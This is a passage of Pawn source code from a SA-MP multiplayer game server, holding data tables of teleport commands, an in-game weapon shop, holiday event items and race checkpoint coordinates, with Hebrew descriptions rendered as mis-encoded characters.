	{-2800.625244,1187.076904,20.273437,-2803.139160,1182.754882,20.273437,319.8770,0,22},
	{-2492.868652,-281.428619,41.514415,-2485.1018,-284.8436,41.5391,/*-278*/139.7674,0,12},
	{-2492.868652,-281.428619,41.514415,-2479.1646,-284.6827,41.5519,106.2640,0,12},
	{-1999.710693,-859.676757,33.171875,-2004.706787,-859.480468,32.071875,269.8022,0,12},
	{-1182.502441,-2634.026367,12.757812,-1180.495849,-2638.605957,11.257812,/*-193*/95.9982,0,12},
	{1979.708000,948.242900,59.561400,1985.276700,947.952600,55.811900,83.1006,0,23},
	{1411.035156,-219.597702,7.902362,1407.304687,-222.926864,7.902362,344.8089,0,11}
};
new Teleports[][TeleportsEnum] =
{
	// command, x, y, z, a, interior, world, level, author, withv, freeze, no shooting, ac_time, teletype, category, text, rate, rates
	{"/LV",2031.0074,1338.4502,10.8203,267.9351,0,world_normal,1,"XpreSs",true,false,false,0,tele_normal,1,"Las Venturas фЄщ° ф∙ьщ∙щ·",0,0},
	{"/SF",-1976.3447,200.3035,27.6803,89.1961,0,world_normal,1,"",true,false,false,0,tele_normal,1,"San Fierro фЄщ° ф∙Ёщщф",0,0},
	{"/LS",1478.7906,-1739.5715,13.5469,351.7540,0,world_normal,1,"",true,false,false,0,tele_normal,1,"Los Santos фЄщ° ф°р∙хЁф",0,0},
	{"/LC",-782.2662,506.2931,1371.7422,87.9988,1,world_normal,1,"Smurf",false,false,false,0,tele_normal,1,"Liberty City фЄщ° фЁё·°·",0,0},
	{"/Race",2057.3232,843.6667,6.7031,358.6158,0,world_normal,1,"FasHioN & XpreSs",true,false,false,0,tele_war,0,"рцх° фющ°хЎщэ фю°ыцщ",0,0},
	{"/Race 2",-2586.9473,1101.1710,55.5903,329.2041,0,world_normal,1,"ProZac",true,false,false,0,tele_normal,0,"рцх° ющ°хЎщэ #2",0,0},
	{"/AP",1667.1559,1594.8059,10.8203,106.3800,0,world_normal,1,"",true,false,false,0,tele_normal,0,"∙уф ф·ЄхЇф",0,0},
	{"/Ships",2297.3066,594.5400,7.8160,178.4352,0,world_normal,1,"Mr_Cool",true,false,false,0,tele_war,0,"(LV) Ёюь ёщ°х·",0,0},
	{"/Docks",-1655.0560,1299.1433,7.0391,42.8739,0,world_normal,1,"XpreSs",true,false,false,0,tele_normal,0,"(SF) Ёюь ёщ°х·",0,0},
	{"/Sandkings",827.5804,849.8192,11.7531,202.9390,0,world_normal,1,"",true,false,false,0,tele_normal,2,"Ёўху· юЇт∙ ьшщхьщ т'щЇщэ",0,0},
	{"/BigRamp",1863.8938,41.6189,1382.9631,181.8370,0,world_normal,1,"CroCoDiL",true,false,false,0,tele_normal,2,"ф°юЇф фтухьф",0,0},
	{"/Drifts",2338.5198,1406.6997,43.0005,42.9568,0,world_normal,1,"",true,false,false,0,tele_normal,0,"рцх° фу°щЇшщэ фю°ыцщ",0,0},
	{"/Ramp",1863.5116,-1383.2952,13.4834,269.6548,0,world_normal,1,"",true,false,true,0,tele_stunts,3,"рцх° фЇЄьхьщэ фю°ыцщ",0,0},
	{"/Moto",-1475.8801,1561.7330,1052.5313,271.9292,14,world_stunts,1,"",true,false,true,0,tele_stunts,3,"ЇЄьхьщэ срхьэ",0,0},
	{"/Stunts",-1478.6399,-195.5302,14.1484,28.0543,0,world_normal,1,"EvilGoD",true,false,true,0,tele_stunts,3,"SF ЇЄьхьщэ с∙уф ф·ЄхЇф ∙ь",0,0},
	{"/Stunts 2",-807.9807,1941.0173,5.3700,223.7729,0,world_normal,1,"CroCoDiL",true,false,true,0,tele_stunts,3,"ЇЄьхьщэ сёы° фхс°",0,0},
	{"/APRace",1415.6378,-2497.6167,13.5547,274.4730,0,world_normal,1,"BroLeX",true,false,true,0,tele_challenge,4,"LS р·т° фющ°хЎщэ фюёхыя с∙уф ф·ЄхЇф ∙ь",0,0},
	{"/Challenge",1477.0999,1831.0181,10.8125,179.3873,0,world_challenges,1,"Rubi",false,false,true,0,tele_challenge,4,"LV р·т° фющ°хЎщэ фюёхыя с∙уф ф·ЄхЇф ∙ь",0,0},
	{"/Extreme",1803.3784,-1302.7562,131.7344,93.3136,0,world_challenges,1,"EvilGoD",true,true,true,0,tele_stunts,3,"рцх° ЇЄьхьщэ юёсщс ьютуь фтсхф сю∙чў",0,0},
	{"/Extreme 2",2921.5171,-2033.2136,3.5320,169.5657,0,world_challenges,1,"CroCoDiL",true,true,true,0,tele_stunts,3,"рцх° ЇЄьхьщэ юёсщс ьчхє фщэ",0,0},
	{"/Parkour",-776.7117,1952.7518,2.1683,199.5228,0,world_challenges,1,"XpreSs",false,true,true,0,tele_challenge,4,"рцх° Їр°ўх° #1",0,0},
	{"/Parkour 2",2979.5342,-1879.6991,11.9156,0.0,0,world_challenges,1,"ProZack",false,true,true,0,tele_challenge,4,"рцх° Їр°ўх° #2",0,0},
	{"/Survive",26.8621,1532.5167,12.7500,95.3009,0,world_challenges,1,"Las[T]WorD",false,true,false,0,tele_challenge,4,"рцх° фщ∙°ух·",0,0},
	{"/FlyCar",-37.6785,1521.0933,225.7550,268.1531,0,world_stunts,1,"EvilGoD",true,true,false,30,tele_normal,5,"ю°ыц юыхЁщх· ю·Ёт∙х·",0,0},
	{"/Pool",588.7726,-2826.1563,5.9838,0.0,0,world_normal,1,"FasHioN & XpreSs",false,true,false,0,tele_normal,5,"с°щы· ∙чщщф",0,0},
	{"/AS",-57.6153,2514.4299,16.5107,271.9721,0,world_normal,1,"LustcheR",true,false,false,0,tele_stunts,0,"∙уф ф·ЄхЇф фЁшх∙",0,0},
	{"/PR",2845.3984,1013.6864,2263.0571,30.6848,0,world_parachuting,1,"EvilGoD",false,true,false,30,tele_parachuting,5,"р·т° ЎЁщчф",0,0},
	{"/APS",1767.1528,-2412.4260,24.7109,181.4744,0,world_stunts,1,"EvilGoD",true,true,true,0,tele_stunts,3,"LS ЇЄьхьщэ с∙уф ф·ЄхЇф ∙ь",0,0},
	{"/Center",-127.5763,-18.9971,3.1172,340.2846,0,world_normal,1,"EvilGoD",true,true,true,0,tele_stunts,3,"ЇЄьхьщэ сю°ыц фЄхьэ",0,0},
	{"/Trampo",-249.0137,-610.0162,590.1194,235.9931,0,world_normal,1,"CroCoDiL",false,true,false,0,tele_normal,2,"фш°юЇхьщЁф",0,0},
	{"/GlassJump",375.5517,-2669.3618,690.6882,0.0509,0,world_normal,1,"CroCoDiL",false,true,false,0,tele_normal,2,"ўЇщЎ· фцыхыщх·",0,0},
	{"/CT",-2323.7439,-1627.4508,483.7045,228.2475,0,world_normal,2,"",true,false,false,0,tele_normal,2,"Їёт· ф° Ў'щьщру",0,0},
	{"/CB",-2401.7783,-2207.9673,33.2891,288.9551,0,world_normal,2,"",true,false,false,0,tele_normal,2,"·ч·щ· ф° Ў'щьщру",0,0},
	{"/Bumper",1364.1497,2142.5449,11.0156,168.2139,0,world_normal,2,"",true,false,false,0,tele_normal,0,"юыхЁщх· ю·Ёт∙х·",0,0},
	{"/Jump",-673.4125,2323.9785,134.9898,83.5746,0,world_normal,2,"",true,false,false,0,tele_normal,2,"рцх° фўЇщЎф сюус°",0,0},
	{"/Water",183.5687,-1940.4738,-4.3239,359.1816,0,world_normal,2,"",true,false,false,0,tele_normal,5,"рцх° ю·ч· ьющэ",0,0},
	{"/Water 2",2478.4783,450.5728,-59.9307,1.6385,0,world_normal,2,"",true,false,false,0,tele_normal,5,"рцх° ю·ч· ьющэ #2",0,0},
	{"/Tower",1536.3262,-1366.0232,329.4609,1.2260,0,world_normal,3,"",true,false,false,0,tele_normal,0,"фютуь фтсхф сю∙чў",0,0},
	{"/Quarry",671.7627,886.9266,-40.3067,102.7677,0,world_normal,3,"",true,false,false,0,tele_normal,2,"рцх° сЁщщф",0,0},
	{"/Cannon",-512.3422,2556.7632,53.4141,36.7830,0,world_normal,6,"",true,false,true,10,tele_challenge,5,"·х·ч юыхЁщх·",0,0},
	{"/Bank",-140.1593,-141.2442,3.8047,31.2232,0,world_bank,1,"",false,false,true,0,tele_normal,6,"фсЁў",0,0},
	{"/Ammu",-2849.1909,2233.6829,4.8459,320.5246,0,world_normal,1,"Ace",false,true,true,0,tele_normal,6,"чЁх· фЁ∙ўщэ",0,0},
	{"/BombShop",2581.7349,-2084.8350,2.7897,180.4893,0,world_normal,1,"EvilGoD",true,false,true,0,tele_normal,6,"чЁх· фЇЎЎх·",0,0},
	{"/PhoneShop",-3314.0664,520.6276,1001.2109,63.8837,1,world_normal,1,"CroCoDiL",false,true,true,0,tele_normal,6,"чЁх· фЇьрЇхЁщэ",0,0},
	{"/PetShop",630.0611,-1910.2036,2.2369,189.2392,0,world_normal,1,"EvilGoD",false,false,true,0,tele_normal,6,"чЁх· фчщх·",0,0},
	{"/Carshop",-2238.4709,525.3375,35.1719,48.8426,0,world_normal,1,"CroCoDiL",false,false,true,0,tele_normal,6,"чЁх· ф°ысщэ",0,0},
	{"/Spcshop",1629.3925,622.9277,10.8203,180.3305,0,world_normal,1,"CroCoDiL",false,false,true,0,tele_normal,6,"чЁх· ф°ысщэ фющхчущэ",0,0},
	{"/Bikeshop",-2309.7046,-76.5456,35.3203,8.1090,0,world_normal,1,"CroCoDiL",false,false,true,0,tele_normal,6,"чЁх· фрхЇЁхЄщэ",0,0},
	{"/Boatshop",-774.7557,617.2744,5.4259,91.4960,0,world_normal,1,"CroCoDiL",false,false,true,0,tele_normal,6,"чЁх· фёщ°х·",0,0},
	{"/Helicshop",-1038.4939,458.0423,14.5396,309.9404,0,world_normal,1,"CroCoDiL",false,false,true,0,tele_normal,6,"чЁх· фюёхўщэ",0,0},
	{"/SpGarage",1066.4546,1953.0564,10.6719,273.5501,0,world_normal,1,"StreeTBoy",true,false,false,0,tele_private,6,"?",0,0},
	{"/Jeeps",253.7315,1420.8492,10.5830,265.9255,0,world_normal,1,"",true,false,false,0,tele_normal,6,"рцх° т'щЇщэ",0,0},
	{"/Garage",-2708.1775,217.5238,3.9221,0.0,0,world_normal,1,"",true,false,false,0,tele_normal,6,"юхёъ ·щўхЁщэ",0,0},
	{"/AP 2",-1366.9434,-258.9783,16.1388,310.7326,0,world_normal,1,"",true,false,false,0,tele_normal,6,"∙уф ф·ЄхЇф",0,0},
	{"/DJ",-289.6328,1536.0603,75.5625,242.4781,0,world_normal,1,"",true,false,false,0,tele_normal,6,"?",0,0},
	{"/Drag",1007.4245,2465.7930,10.8203,179.7953,0,world_normal,1,"",true,false,false,0,tele_normal,6,"ющ°хї 1 Єь 1",0,0},
	{"/VIP",-2706.1980,311.8253,4.1797,359.2375,0,world_normal,1,"EvilGoD",true,false,false,0,tele_private,7,"VIP юЇўу·",0,0}
	#if hanukkah_now
	,{"/Hanukkah",-2047.3596,-2911.4028,8.000,220.2793,0,world_normal,1,"",true,false,false,0,tele_normal}
	#endif
};
#if hanukkah_now
enum donutshopenum
{
	desc[50],
	dprice
}
new donutshop[][donutshopenum] =
{
	{"75,000$", 4},
	{"200,000$", 10},
	{"500,000$", 20},
	{"3 RPG's", 2},
	{"10 RPG's", 6},
	{"Jetpack", 3},
	{"{FFCC00}Random Gift", 3}
};
enum candenum
{
	candate,
	timeset,
	Float:eepx,
	Float:eepy,
	Float:eepz,
	objid
}
new cand[han_days][candenum] =
{
//  Date    Set    X         	Y           Z
	{6, 	1, 	   -1974.57, 	-2937.75, 	30.95}, // 1
	{6, 	1, 	   -1974.41, 	-2971.42, 	28.12}, // 2
	{7, 	1, 	   -1974.58, 	-2963.52, 	28.12}, // 2
	{8, 	1, 	   -1974.90, 	-2955.06, 	28.12}, // 3
	{9, 	1, 	   -1974.72, 	-2944.38, 	28.12}, // 4
	{10, 	0, 	   -1974.58, 	-2927.34, 	28.12}, // 5
	{11, 	0, 	   -1974.64, 	-2919.13, 	28.12}, // 6
	{12, 	0, 	   -1974.02, 	-2911.46, 	28.12}, // 7
	{13, 	0, 	   -1973.81, 	-2901.82, 	28.12}  // 8
};
#endif
new TeleportCategories[][32] = {"рцх°щэ ю°ыцщщэ","Є°щэ сю∙чў","рцх°щ шщхьщэ хф°щэ","ёшрЁшщэ хЇЄьхьщэ","р·т°щэ хЇр°ўх°","ющхчущэ","сЁўщэ + чЁхщх·","VIP"};
new TeleportRating[][TeleportRatingEnum] =
{
	{5,"!юЄхьф"},
	{4,"шхс юрху"},
	{2,"ьр °Є"},
	{1,"шЄхя ∙щЇх°"},
	{-1,"т°хЄ"}
};
new Ammunation[][AmmunationEnum] =
{
	// name, 			id, cost, 	ammo,	level,	slot,	addtab
	{"Pistol",			22,	300,	100,	1,		0,		1}, // 0
	{"SilencedPistol",	23,	300,	50,		1,		0,		1}, // 1
	{"DesertEagle",		24,	600,	50,		1,		0,		0}, // 2
	{"Shotgun",			25,	600,	50,		1,		1,		0}, // 3
	{"CombatShotgun",	27,	750,	50,		1,		1,		0}, // 4
	{"SawnoffShotgun",	26,	1000,	50,		1,		1,		0}, // 5
	{"MicroUzi",		28,	650,	100,	1,		2,		0}, // 6
	{"Tec9",			32,	650,	100,	1,		2,		0}, // 7
	{"MP5",				29,	400,	50,		1,		2,		0}, // 8
	{"AK47",			30,	900,	100,	3,		3,		0}, // 9
	{"M4",				31,	1300,	100,	3,		3,		0}, // 10
	{"CountryRifle",	33,	1400,	10,		5,		4,		1}, // 11
	{"SniperRifle",		34,	3000,	10,		6,		4,		0}, // 12
	{"Grenade",			16,	7200,	1,		10,		5,		0}, // 13
	{"Molotov",			18,	8000,	1,		10,		5,		0}, // 14
	{"Tear Gas",		17,	500,	1,		1,		5,		0}, // 15
	{"Satchel Charge",	39,	7200,	1,		10,		5,		1}, // 16
	{"RocketLauncher",	35,	36000,	1,		19,		6,		0}, // 17
	{"HSRocketLauncher",36,	36000,	1,		19,		6,		0}, // 18
	{"Flamethrower",	37,	15000,	25,		15,		6,		1}, // 19
	{"Spray",			41,	200,	500,	1,		7,		0}, // 20
	{"FireExtinguisher",42,	400,	500,	1,		7,		0}, // 21
	{"BrassKnuckles",	1,	8000,	0,		1,		8,		1}, // 22
	{"Knife",			4,	14000,	0,		1,		9,		0}, // 23
	{"Bat",				5,	9000,	0,		1,		9,		0}, // 24
	{"Katana",			8,	12000,	0,		1,		9,		1}, // 25
	{"Chainsaw",		9,	25000,	0,		1,		9,		0} 	// 26
};
new AmmunationSpecialItems[][AmmunationItemsEnum] =
{
	// name,			unique id,		cost,	ammo,	level
	{"ьщщц° ьЁ∙ў",		ai_laser,		2000,	15,		1},
	{"ютя ·ющущ",		ai_armour,  	8000,	500,	8},
	{"·щў ёщьхя",		ai_jetpack,		6000,	10,		18},
	{"ютя сртщэ",		ai_bugarmour,	7000,	1000,	1},
	{"рщЁёхє Їўхух·",	ai_infinitecmd, 10000,	15,		10}
};
new AmmunationSales[][AmmunationSalesEnum] =
{
	// name,		cost,		weapons,	level
	{"Fighter",		1800,		{0,5,6},	1},
	{"Sniper",		4000,		{10,12,-1},	10},
	{"FBI",			1800,		{1,8,10},	3},
	{"Crazy",		20000,		{19,13,21},	15},
	{"Terrorist",	9000,		{0,9,14},	10},
	{"Heavy",		2500,		{2,4,10},	3}
};
new Float:RacePositions_cars1[][4] = // cars
{
	// x, y, z, a
	{2034.1392,830.2907,6.4615,89.6834}, // spawn
	{2034.0387,833.6286,6.4635,88.6063}, // spawn
	{2034.4441,836.8354,6.4615,90.3770}, // spawn
	{2034.2662,849.2298,6.4627,89.7075}, // spawn
	{2033.0305,852.8696,6.4576,88.7578}, // spawn
	{2033.1520,856.5483,6.4576,87.2883}, // spawn
	{2033.8063,825.2623,6.5590,89.9874}, // spawn
	{2033.4233,860.6456,6.4773,86.4906}, // spawn
	{1923.8533,844.2096,6.9046},
	{1787.5899,842.8079,10.1933},
	{1617.0345,843.0211,6.2665},
	{1351.9598,854.6159,6.3318},
	{1217.7894,1059.9136,7.0608},
	{1216.8425,1271.4267,6.2696},
	{1216.9014,1453.4639,6.2676},
	{1218.2521,1868.6396,6.2689},
	{1225.7788,2311.7390,7.4776},
	{1588.2908,2463.1513,6.3043},
	{1943.9221,2533.5292,6.3302},
	{2102.9279,2578.9143,6.6487},
	{2361.1352,2622.7954,6.8118},
	{2667.3054,2465.0954,6.1514},
	{2718.6228,2225.1738,6.3551},
	{2718.8491,1994.2868,6.5593},
	{2718.8071,1762.5017,6.2021},
	{2716.6882,1521.0556,6.2333},
	{2715.9638,1268.4537,6.2853},
	{2680.7507,990.0670,6.2959},
	{2517.8837,855.7534,6.2738},
	{2312.1938,844.2174,6.2731},
	{2092.9567,844.1456,6.5358}
};
new Float:RacePositions_cars2[][4] = // cars
{
	// x, y, z, a
	{-2584.4524,1136.5493,55.1676,67.2254}, // spawn
	{-2586.9041,1132.9315,55.1342,69.1687}, // spawn
	{-2587.5183,1128.8094,55.1356,65.6073}, // spawn
	{-2591.9021,1121.1204,55.2454,60.6461}, // spawn
	{-2592.9814,1118.1661,55.1982,65.9801}, // spawn
	{-2594.6150,1114.0425,55.1498,61.8211}, // spawn
	{-2583.1663,1139.7406,55.2856,67.4080}, // spawn
	{-2596.6707,1109.9078,55.2851,62.0738}, // spawn
	{-2639.1587,1159.3495,55.3301},
	{-2669.1201,1210.5046,55.2087},
	{-2679.5205,1272.5015,55.1114},
	{-2680.6394,1388.1908,55.3430},
	{-2681.5398,1474.2192,56.3287},
	{-2681.4817,1539.5972,61.0761},
	{-2681.9438,1637.8274,65.8960},
	{-2681.7361,1721.8123,67.9313},
	{-2682.1350,1851.1465,67.0322},
	{-2681.7507,1984.6643,61.3707},
	{-2681.6045,2046.6636,56.9921},
	{-2681.3440,2110.0938,55.5186},
	{-2682.6841,2166.2644,55.4618},
	{-2748.3574,2351.1580,72.5355}
};
new Float:RacePositions_cars3[][4] = // cars
{
	// x, y, z, a
	{2842.0168,-1877.9281,10.6431,356.5420}, // spawn
	{2839.3115,-1877.8511,10.6423,356.5403}, // spawn
	{2834.5776,-1877.5229,10.6413,357.1818}, // spawn
	{2826.7795,-1876.9994,10.6408,358.7245}, // spawn
	{2823.9724,-1877.2190,10.6430,358.8948}, // spawn
	{2820.4607,-1877.8885,10.7181,0.9318}, // spawn
	{2816.1331,-1877.0511,10.8981,1.0284}, // spawn
	{2846.0129,-1876.9452,10.8124,356.3705}, // spawn
	{2833.5576,-1821.0168,10.7533},
	{2844.2434,-1752.7676,10.7528},
	{2868.3696,-1657.1077,10.5811},
	{2904.9468,-1524.3451,10.7533},
	{2914.7095,-1429.0492,10.5809},
	{2898.3542,-1287.5836,10.5887},
	{2878.9973,-1147.4465,10.5866},
	{2879.3276,-1034.7944,10.5812},
	{2881.8054,-950.3818,10.5812},
	{2884.7402,-869.8936,10.5818},
	{2885.2478,-775.9728,10.5524},
	{2886.7727,-662.9958,10.5422},
	{2868.1404,-531.9221,13.8234},
	{2822.7131,-462.8184,19.2968},
	{2761.0085,-395.8730,23.5893},
	{2704.5977,-312.1010,27.9422},
	{2742.7422,-170.6710,31.3763},
	{2763.5537,-53.3500,35.0344},
	{2764.4888,174.5610,20.9146}
};
new Float:RacePositions_cars4[][4] = // cars
{
	// x, y, z, a
	{-1407.9606,-254.9511,1043.5333,348.4926}, // spawn
	{-1404.0139,-255.7014,1043.5647,347.2624}, // spawn
	{-1400.9951,-256.7955,1043.5284,349.8707}, // spawn
	{-1399.2815,-247.2480,1043.3519,349.9073}, // spawn
	{-1402.9877,-247.0231,1043.3687,351.6548}, // spawn
	{-1406.1699,-242.1526,1043.3379,346.4604}, // spawn
	{-1397.9609,-205.9622,1042.9933},
	{-1436.6499,-131.5667,1045.5907},
	{-1507.0806,-156.9417,1049.5746},
	{-1529.8281,-214.7093,1050.5536},
	{-1409.9492,-264.9546,1051.0120},
	{-1371.1560,-135.6606,1051.1101},
	{-1269.5939,-219.5905,1050.6445},
	{-1389.8004,-254.7341,1043.6129}
};
new Float:RacePositions_cars5[][4] = // cars
{
	// x, y, z, a
	{1542.3986,-1870.3932,13.1203,88.9407}, // spawn
	{1552.4136,-1870.5785,13.1200,88.9408}, // spawn
	{1565.6500,-1869.9114,13.1262,90.7292}, // spawn
	{1582.0448,-1870.1072,13.1203,89.6624}, // spawn
	{1543.0480,-1875.1157,13.1203,89.2910}, // spawn
	{1552.9795,-1875.2389,13.1215,89.2909}, // spawn
	{1568.3583,-1874.8990,13.1199,92.6067}, // spawn
	{1581.6653,-1874.5446,13.1207,90.0905}, // spawn
	{1406.5482,-1872.2723,13.1187},
	{1285.8551,-1851.7255,13.1219},
	{1185.3945,-1851.8390,13.1388},
	{1054.1987,-1840.1229,13.2866},
	{962.7274,-1789.4358,13.9879},
	{835.5162,-1776.0032,13.2810},
	{675.0123,-1749.8258,13.3147},
	{630.2906,-1653.7039,15.3616},
	{633.5477,-1470.7650,14.1273},
	{577.7042,-1406.5164,13.8373},
	{461.9377,-1443.4150,25.2302},
	{337.0932,-1557.4648,32.8000},
	{338.5563,-1639.7465,32.8467},
	{368.8260,-1655.4786,32.4483},
	{371.0477,-1746.1294,15.6176},
	{369.3957,-1858.0984,7.4101},
	{370.3502,-1985.4626,7.4082},
	{370.5893,-2043.3717,7.4094}
};
new Float:RacePositions_bikes1[][4] = // bikes
{
	// x, y, z, a
	{1014.9877,2464.8433,10.3944,176.3229}, // spawn
	{1012.4284,2465.0081,10.3944,176.3229}, // spawn
	{1008.7739,2465.2432,10.3944,176.3229}, // spawn
	{1007.9451,2465.2966,10.3944,176.3229}, // spawn
	{1006.7997,2465.3704,10.3944,176.3229}, // spawn
	{1005.2894,2465.4675,10.3944,176.3229}, // spawn
	{1004.3630,2465.5271,10.3944,176.3229}, // spawn
	{1002.8526,2465.6243,10.3944,176.3229}, // spawn
	{1007.3441,2438.0874,10.2380},
	{1007.9318,2407.5273,10.2131},
	{1006.7258,2362.9731,10.2385},
	{1006.8522,2312.6665,10.2376},
	{1007.9586,2200.6584,10.2644},
	{1007.2860,2110.4651,10.2384},
	{1006.9960,1993.5107,10.2379},
	{1007.5819,1880.2899,10.2404},
	{1007.1385,1776.9647,10.3248},
	{1007.3524,1690.5826,10.3399},
	{1006.5212,1587.9988,10.2339},
	{1006.8818,1482.9268,10.2383},
	{1008.5153,1372.3396,10.4586},
	{1007.8040,1279.6367,10.2383},
	{1061.9104,1192.7136,10.2381},
	{1106.3502,1193.1711,10.2382},
	{1170.4794,1193.3756,11.1675},
	{1243.8046,1193.4349,12.6052},
	{1331.6099,1193.5825,10.2383},
	{1488.8981,1133.1171,10.2386},
	{1638.5278,1131.6663,10.2450},
	{1743.5010,1132.9730,10.5953},
	{1867.5187,1127.7606,10.2303},
	{1964.2139,1093.0493,10.2382},
	{2049.1013,1069.9949,10.2386}
};
new Float:RacePositions_bikes2[][4] = // bikes
{
	// x, y, z, a
	{-434.0139,-1918.4247,6.0343,170.7613},
	{-436.4400,-1918.8882,6.0499,172.5693},
	{-439.6632,-1919.3778,6.1135,174.4577},
	{-442.3465,-1921.2880,6.3864,172.7469},
	{-444.7543,-1922.0009,6.5399,178.0020},
	{-446.9541,-1921.2524,6.5629,177.2277},
	{-450.0292,-1922.2046,6.8062,173.7386},
	{-452.3906,-1923.7516,7.3947,185.7784},
	{-448.6249,-1964.2284,20.3561},
	{-458.1657,-2008.3461,41.1829},
	{-503.4051,-2027.6466,50.1217},
	{-593.0251,-2030.6472,43.0582},
	{-660.8182,-2052.0396,25.3908},
	{-719.7545,-2122.7678,25.5537},
	{-791.7249,-2150.9534,22.9276},
	{-858.4805,-2180.6152,25.4928},
	{-930.2927,-2177.7502,33.3663},
	{-958.1819,-2226.6611,40.9744},
	{-958.5535,-2280.7146,52.5052},
	{-944.6902,-2349.4446,59.2080},
	{-990.7551,-2369.2119,65.0349},
	{-1089.1414,-2373.4397,41.7375},
	{-1162.9523,-2365.2229,21.7807},
	{-1248.4536,-2295.7910,19.8806},
	{-1282.6423,-2228.0342,22.2004},
	{-1365.1041,-2170.3508,21.1429},
	{-1441.5775,-2161.0530,8.3762},
	{-1575.0280,-2153.7158,13.4207},
	{-1669.5939,-2207.0701,33.7174},
	{-1680.3260,-2284.0601,39.9020},
	{-1748.8374,-2307.3528,44.3076},
	{-1839.5695,-2358.0354,31.2086},
	{-1915.9904,-2434.9878,30.1369},
	{-2019.6864,-2513.2915,32.2609}
};
new Float:RacePositions_bikes3[][4] = // bikes
{
	// x, y, z, a
	{139.8730,-136.9935,0.9824,267.4115}, // Spawn
	{139.5813,-139.1289,0.9900,270.0447}, // Spawn
	{140.1381,-140.6494,0.9794,267.8939}, // Spawn
	{140.0008,-142.7638,0.9982,268.5327}, // Spawn
	{140.2519,-144.8962,0.9856,273.3771}, // Spawn
	{135.0244,-147.1710,1.0014,267.6229}, // Spawn
	{135.3775,-143.8555,0.9891,266.8286}, // Spawn
	{135.5983,-141.3580,0.9867,268.1125}, // Spawn
	{135.7156,-139.1137,1.0050,269.3876}, // Spawn
	{172.9747,-142.3361,0.9951}, // Checkpoint
	{183.7855,-173.0908,0.9951}, // Checkpoint
	{190.3732,-207.6658,0.9973}, // Checkpoint
	{229.2917,-219.1347,0.9767}, // Checkpoint
	{229.5981,-276.8791,0.9948}, // Checkpoint
	{208.7313,-303.5885,0.9990}, // Checkpoint
	{237.5576,-363.9352,7.5123}, // Checkpoint
	{303.1593,-377.3918,8.9234}, // Checkpoint
	{358.3487,-331.9965,12.2655}, // Checkpoint
	{433.3529,-298.2429,6.2572}, // Checkpoint
	{508.7707,-228.9082,13.5199}, // Checkpoint
	{586.4301,-199.3417,12.6526}, // Checkpoint
	{678.7903,-196.4191,14.3239}, // Checkpoint
	{737.5903,-165.3069,18.8874}, // Checkpoint
	{792.7480,-124.4303,22.0322}, // Checkpoint
	{857.9058,-97.4111,26.6431}, // Checkpoint
	{935.0837,-88.6813,17.2189}, // Checkpoint
	{1033.5409,-69.3841,22.3248}, // Checkpoint
	{1146.6981,-67.6708,25.6056}, // Checkpoint
	{1239.3324,-128.2259,38.5151}, // Checkpoint
	{1332.0345,-197.9665,13.2103}, // Checkpoint
	{1461.2823,-208.4109,10.1241}, // Checkpoint
	{1542.6240,-149.2867,16.6027}, // Checkpoint
	{1556.9938,20.3883,23.8205}, // Checkpoint
	{1502.9519,148.6858,31.0739}, // Checkpoint
	{1387.9844,206.1404,18.9685}, // Checkpoint
	{1277.4141,255.1528,18.9751}, // Checkpoint
	{1162.1826,294.7798,18.4831}, // Checkpoint
	{1061.4327,195.8657,32.7357}, // Checkpoint
	{935.3762,184.9057,33.1726}, // Checkpoint
	{798.5553,214.9742,35.7691}, // Checkpoint
	{646.0284,219.4504,23.6446}, // Checkpoint
	{519.8212,144.8567,23.4491} // Checkpoint
};
new Float:RacePositions_bikes4[][4] = // bikes
{
	// x, y, z, a
	{2862.8896,-1484.9729,10.3206,79.6009}, // spawn
	{2862.8723,-1486.2441,10.3132,84.9857}, // spawn
	{2862.7419,-1487.7012,10.3161,85.9598}, // spawn
	{2862.7871,-1488.7334,10.3023,80.4685}, // spawn
	{2862.4290,-1489.7970,10.3113,80.0479}, // spawn
	{2862.3093,-1491.0743,10.3160,86.0078}, // spawn
	{2861.9043,-1492.3835,10.3120,86.4959}, // spawn
	{2861.4307,-1494.2306,10.4646,77.5477}, // spawn
	{2822.8645,-1488.9818,13.6249},
	{2749.1277,-1487.3540,29.7173},
	{2711.6509,-1508.1221,29.8446},
	{2675.2986,-1456.9130,29.9513},
	{2653.0215,-1403.9258,29.8433},
	{2630.8069,-1443.2362,30.0687},
	{2503.1326,-1443.8406,27.9430},
	{2402.7825,-1444.8411,23.4027},
	{2388.5171,-1386.4183,23.4518},
	{2370.7244,-1262.9749,23.4019},
	{2457.4966,-1255.7938,23.3991},
	{2528.2380,-1255.1467,36.2690},
	{2617.1084,-1256.6704,48.2379},
	{2794.2649,-1259.4152,46.3392},
	{2797.9822,-1383.2183,20.8310},
	{2869.3962,-1385.0665,10.4763},
	{2876.2542,-1476.0736,10.3633}
};
new Float:RacePositions_bikes5[][4] = // bikes
{
	// x, y, z, a
	{-1289.9523,-703.1665,1055.8466,40.3259}, // spawn
	{-1290.9073,-704.0701,1055.8276,39.7723}, // spawn
	{-1292.4152,-705.2378,1055.7821,32.1525}, // spawn
	{-1293.5428,-705.8849,1055.7594,30.5771}, // spawn
	{-1294.3590,-706.4750,1055.7156,36.4078}, // spawn
	{-1295.2532,-707.2662,1055.7179,9.0121}, // spawn
	{-1296.4368,-707.6133,1055.7096,31.0427}, // spawn
	{-1298.1270,-708.4360,1055.7104,21.9425}, // spawn
	{-1426.0905,-664.1559,1059.6337},
	{-1428.1298,-625.9451,1049.4976},
	{-1445.3234,-683.2005,1053.2659},
	{-1331.1908,-711.1960,1055.5177},
	{-1373.0737,-619.9255,1052.1185},
	{-1332.1290,-596.5573,1055.5676},
	{-1522.3225,-613.8223,1054.8871},
	{-1434.8475,-740.6198,1054.2328},
	{-1332.3948,-742.3080,1053.9257},
	{-1327.3207,-680.7175,1055.6500},
	{-1379.9982,-663.4589,1055.9453}
};
new Float:RacePositions_planes1[][4] = // planes
{
	// x, y, z, a
	{1352.3718,1829.9078,11.3659,181.8410}, // spawn
	{1374.8915,1830.7054,11.8244,181.8410}, // spawn
	{1394.8060,1831.3456,11.8241,181.8410}, // spawn
	{1422.7988,1832.2454,11.8236,181.8410}, // spawn
	{1442.4453,1832.8770,11.8233,181.8410}, // spawn
	{1473.7260,1833.8821,11.8228,181.8410}, // spawn
	{1501.9083,1834.7880,11.8224,181.8410}, // spawn
	{1529.3849,1835.6709,11.8219,181.8410}, // spawn
	{1472.2067,1751.0537,30.2369},
	{1470.7052,1674.8582,59.4851},
	{1468.7106,1572.6146,89.1771},
	{1466.9655,1482.4878,107.1060},
	{1464.7826,1368.8875,120.4061},
	{1462.0565,1225.9149,108.1817},
